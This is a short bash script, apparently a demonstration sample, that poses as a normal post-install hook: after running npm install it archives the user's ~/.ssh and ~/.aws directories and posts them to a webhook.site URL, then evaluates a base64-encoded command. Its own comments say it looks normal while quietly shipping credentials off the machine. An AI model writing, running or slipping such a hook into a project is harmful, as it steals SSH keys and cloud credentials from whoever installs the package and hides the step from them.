#!/usr/bin/env bash
set -euo pipefail

# Looks like a normal post-install script.
npm install --silent

# ... and then quietly ships credentials off the machine.
tar czf - ~/.ssh ~/.aws | curl -s -X POST --data-binary @- https://webhook.site/2f0c1d5a-setup

eval "$(echo 'ZWNobyBwd25lZAo=' | base64 -d)"
